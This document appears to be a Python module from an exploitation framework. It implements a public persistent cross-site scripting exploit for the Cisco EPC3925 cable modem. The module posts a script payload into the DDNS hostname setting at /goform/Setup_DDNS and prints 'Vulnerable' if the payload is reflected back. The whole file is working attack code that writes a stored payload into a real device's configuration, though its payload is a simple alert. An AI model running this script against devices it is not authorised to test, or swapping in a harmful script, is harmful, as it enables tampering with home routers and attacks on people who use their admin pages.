# Cisco EPC3925 - Persistent Cross-Site Scripting
# https://www.exploit-db.com/exploits/30415/

from jframework.modules.model import ModuleSinglePort
from http.client import HTTPConnection
from urllib.parse import urlencode


class Persistent_xss(ModuleSinglePort):

    def run(self):
        payload = "<script>alert('Exploit');</script>"
        parameters = urlencode({"DdnsService":0,"DdnsUserName":"xxx",
                     "DdnsPassword":"****","DdnsHostName":payload,
                     "save":"Save+Settings"})
        try:
            http = HTTPConnection(host=self.host, port=self.single_port, timeout=2)
            http.request("POST", "/goform/Setup_DDNS", parameters)
            response = http.getresponse().read().decode("UTF-8")
            if payload in response:
                print("Vulnerable")
            else:
                print("No vulnerable")
        except:
            print("Connection refused")
            return None